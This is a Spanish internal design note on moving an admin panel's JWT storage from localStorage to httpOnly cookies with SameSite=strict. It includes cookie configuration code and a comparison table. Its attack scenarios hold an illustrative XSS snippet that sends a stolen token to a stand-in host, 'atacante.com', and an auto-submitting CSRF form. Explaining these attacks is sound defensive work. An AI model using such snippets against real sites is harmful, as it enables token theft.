# Estrategia de Seguridad: httpOnly Cookies con SameSite

**Fecha:** 20 Enero 2026  
**Contexto:** Migración de localStorage a httpOnly cookies

---

## 🎯 PROBLEMA A RESOLVER

Necesitamos almacenar tokens JWT de forma segura en el navegador para autenticación del Admin Panel.

---

## ⚖️ COMPARACIÓN: localStorage vs httpOnly Cookie

### localStorage

**Ventajas:**
- ✅ Nos protege de CSRF (Cross-Site Request Forgery)
  - El atacante no puede leer el token desde otro sitio
  - Debe enviarse manualmente en cada request

**Desventajas:**
- ❌ Nos expone a XSS (Cross-Site Scripting)
  - JavaScript malicioso puede leer el token
  - `localStorage.getItem('token')` accesible desde cualquier script
  - Un solo script comprometido = token robado

**Conclusión:** localStorage es vulnerable a XSS, que es el ataque más común.

---

### httpOnly Cookie

**Ventajas:**
- ✅ Nos protege de XSS (Cross-Site Scripting)
  - JavaScript NO puede leer la cookie
  - `document.cookie` no muestra cookies httpOnly
  - Incluso con script malicioso, el token está seguro

**Desventajas:**
- ❌ Nos expone a CSRF (Cross-Site Request Forgery)
  - El navegador envía la cookie automáticamente
  - Un sitio malicioso puede hacer requests a nuestro API
  - El navegador incluirá la cookie sin que el usuario lo sepa

**Solución:** ✅ **Mitigable con SameSite=strict**

---

## 🛡️ SOLUCIÓN: httpOnly + SameSite=strict

### Configuración de Cookie

```typescript
response.cookies.set('auth_token', token, {
  httpOnly: true,      // XSS protection
  sameSite: 'strict',  // CSRF protection
  secure: true,        // HTTPS only (production)
  maxAge: 1800,        // 30 minutes
  path: '/',
});
```

### Cómo Funciona

1. **httpOnly: true**
   - Cookie NO accesible desde JavaScript
   - `document.cookie` no la muestra
   - Solo el navegador puede leerla
   - ✅ **Protege contra XSS**

2. **sameSite: 'strict'**
   - Cookie solo se envía en requests same-site
   - Si el request viene de otro dominio, NO se envía la cookie
   - Ejemplo:
     - ✅ `https://tuapp.com/api/admin/employees` → Cookie enviada
     - ❌ `https://sitiomalicioso.com` → Cookie NO enviada
   - ✅ **Protege contra CSRF**

3. **secure: true** (producción)
   - Cookie solo se envía por HTTPS
   - Protege contra man-in-the-middle
   - ✅ **Protege contra interceptación**

4. **maxAge: 1800** (30 minutos)
   - Sesión de corta duración
   - Reduce ventana de ataque
   - ✅ **Limita exposición temporal**

---

## 📊 TABLA COMPARATIVA

| Característica | localStorage | httpOnly Cookie | httpOnly + SameSite |
|----------------|--------------|-----------------|---------------------|
| **Protección XSS** | ❌ Vulnerable | ✅ Protegido | ✅ Protegido |
| **Protección CSRF** | ✅ Protegido | ❌ Vulnerable | ✅ Protegido |
| **Acceso desde JS** | ✅ Sí | ❌ No | ❌ No |
| **Envío automático** | ❌ No | ✅ Sí | ✅ Sí (solo same-site) |
| **Seguridad general** | ⚠️ Media | ⚠️ Media | ✅ Alta |

---

## 🔐 CAPAS DE SEGURIDAD IMPLEMENTADAS

### Capa 1: httpOnly Cookie
- **Protege contra:** XSS
- **Cómo:** Token no accesible desde JavaScript
- **Resultado:** Script malicioso no puede robar el token

### Capa 2: SameSite=strict
- **Protege contra:** CSRF
- **Cómo:** Cookie solo se envía en requests same-site
- **Resultado:** Sitio malicioso no puede hacer requests autenticados

### Capa 3: Secure Flag
- **Protege contra:** Man-in-the-middle
- **Cómo:** Cookie solo se envía por HTTPS
- **Resultado:** Token no se intercepta en tránsito

### Capa 4: Expiración Corta
- **Protege contra:** Sesiones perpetuas
- **Cómo:** Cookie expira en 30 minutos
- **Resultado:** Ventana de ataque limitada

### Capa 5: Revocación en BD
- **Protege contra:** Tokens robados
- **Cómo:** Logout invalida sesión en base de datos
- **Resultado:** Token no válido incluso si no expiró

### Capa 6: Audit Log
- **Protege contra:** Accesos no autorizados
- **Cómo:** Todos los logins/logouts registrados
- **Resultado:** Trazabilidad completa de accesos

---

## 🚨 ESCENARIOS DE ATAQUE

### Escenario 1: XSS Attack

**Con localStorage:**
```javascript
// Script malicioso inyectado
const token = localStorage.getItem('auth_token');
fetch('https://atacante.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
// ❌ Token robado
```

**Con httpOnly Cookie:**
```javascript
// Script malicioso inyectado
const token = document.cookie; // No contiene auth_token
// ✅ Token seguro, no accesible
```

---

### Escenario 2: CSRF Attack

**Con httpOnly Cookie (sin SameSite):**
```html
<!-- Sitio malicioso -->
<form action="https://tuapp.com/api/admin/employees" method="POST">
  <input name="name" value="Hacker" />
</form>
<script>
  document.forms[0].submit();
  // ❌ Cookie enviada automáticamente
</script>
```

**Con httpOnly Cookie + SameSite=strict:**
```html
<!-- Sitio malicioso -->
<form action="https://tuapp.com/api/admin/employees" method="POST">
  <input name="name" value="Hacker" />
</form>
<script>
  document.forms[0].submit();
  // ✅ Cookie NO enviada (cross-site request)
</script>
```

---

## 📝 IMPLEMENTACIÓN EN CÓDIGO

### Backend: Configurar Cookie

```typescript
// src/app/api/auth/login/route.ts
response.cookies.set('auth_token', token, {
  httpOnly: true,                              // XSS protection
  secure: process.env.NODE_ENV === 'production', // HTTPS only
  sameSite: 'strict',                          // CSRF protection
  maxAge: 1800,                                // 30 minutes
  path: '/',
});
```

### Frontend: Usar Cookie (automático)

```typescript
// src/app/admin/layout.tsx
const response = await fetch('/api/auth/session', {
  credentials: 'include', // Envía cookie automáticamente
});
```

**Nota:** NO necesitas leer ni enviar el token manualmente. El navegador lo hace automáticamente.

---

## ✅ VENTAJAS DE ESTA SOLUCIÓN

1. **Seguridad Máxima**
   - Protección contra XSS ✅
   - Protección contra CSRF ✅
   - Protección contra MITM ✅

2. **Simplicidad en Frontend**
   - No necesitas manejar tokens manualmente
   - No necesitas agregar headers Authorization
   - Solo `credentials: 'include'` en fetch

3. **Backward Compatibility**
   - Middleware sigue aceptando Authorization header
   - Migración gradual posible
   - Terminales POS no afectados

4. **Cumplimiento de Estándares**
   - Sigue mejores prácticas de seguridad web
   - Compatible con OWASP Top 10
   - Preparado para auditorías de seguridad

---

## 🎯 CONCLUSIÓN

**httpOnly cookies con SameSite=strict es la solución más segura para almacenar tokens JWT en el navegador.**

- ✅ Protege contra XSS (httpOnly)
- ✅ Protege contra CSRF (SameSite=strict)
- ✅ Protege contra MITM (secure)
- ✅ Limita exposición temporal (maxAge)
- ✅ Permite revocación inmediata (BD)
- ✅ Trazabilidad completa (audit log)

**localStorage solo protege contra CSRF, pero nos expone a XSS, que es el ataque más común.**

---

## 📚 REFERENCIAS

- [OWASP: HttpOnly Cookie](https://owasp.org/www-community/HttpOnly)
- [MDN: SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Última actualización:** 20 Enero 2026  
**Autor:** Dev 1  
**Revisado por:** [Pendiente]
